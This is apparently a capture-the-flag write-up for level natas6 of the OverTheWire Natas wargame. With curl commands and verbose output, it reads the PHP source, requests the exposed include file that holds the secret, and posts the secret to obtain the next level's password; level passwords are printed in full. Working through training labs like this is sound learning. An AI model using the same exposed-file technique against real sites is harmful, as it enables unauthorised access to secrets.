### natas6 pswd: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

```bash
curl -v -s -c cookie.txt -X POST http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org

# * Host natas6.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas6.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 49362 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas6'
# > POST / HTTP/1.1
# > Host: natas6.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 14:04:54 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 990
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
# <body>
# <h1>natas6</h1>
# <div id="content">
# 
# 
# <form method=post>
# Input secret: <input name=secret><br>
# <input type=submit name=submit>
# </form>
# 
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# * Connection #0 to host natas6.natas.labs.overthewire.org:80 left intact
# 
```

clicking `view_source` in firefox we can see the php source code

```php
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

which uses `$secret` undefined variable.

Maybe the `includes/secret.inc` has the definition.

```bash
curl -v -s -c cookie.txt -X POST http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org/includes/secret.inc
#* Host natas6.natas.labs.overthewire.org:80 was resolved.
#* IPv6: (none)
#* IPv4: 13.53.215.123
#*   Trying 13.53.215.123:80...
#* Established connection to natas6.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 55078 
#* using HTTP/1.x
#* Server auth using Basic with user 'natas6'
#> POST /includes/secret.inc HTTP/1.1
#> Host: natas6.natas.labs.overthewire.org
#> Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk
#> User-Agent: curl/8.19.0
#> Accept: */*
#> 
#* Request completely sent off
#< HTTP/1.1 200 OK
#< Date: Fri, 19 Jun 2026 14:22:01 GMT
#< Server: Apache/2.4.58 (Ubuntu)
#< Last-Modified: Sun, 14 Jun 2026 17:38:52 GMT
#< ETag: "27-6543a2ef4a3c0"
#< Accept-Ranges: bytes
#< Content-Length: 39
#< 
#<?
#
$secret = "FOEIUWGHFEEUHOFUOIU";
# ?>
# * Connection #0 to host natas6.natas.labs.overthewire.org:80 left intact
```

We can enter the secret on firefox, and we can check the POST request raw data, to see the format and to replicate it with curl:

```bash
curl -v -s -c cookie.txt -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" -X POST http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org

# Note: Unnecessary use of -X or --request, POST is already inferred.
# * Host natas6.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas6.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 49238 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas6'
# > POST / HTTP/1.1
# > Host: natas6.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk
# > User-Agent: curl/8.19.0
# > Accept: */*
# > Content-Length: 46
# > Content-Type: application/x-www-form-urlencoded
# > 
# * upload completely sent off: 46 bytes
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 14:29:17 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 1065
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
# <body>
# <h1>natas6</h1>
# <div id="content">
# 
  Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
# <form method=post>
# Input secret: <input name=secret><br>
# <input type=submit name=submit>
# </form>
# 
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# * Connection #0 to host natas6.natas.labs.overthewire.org:80 left intact


```


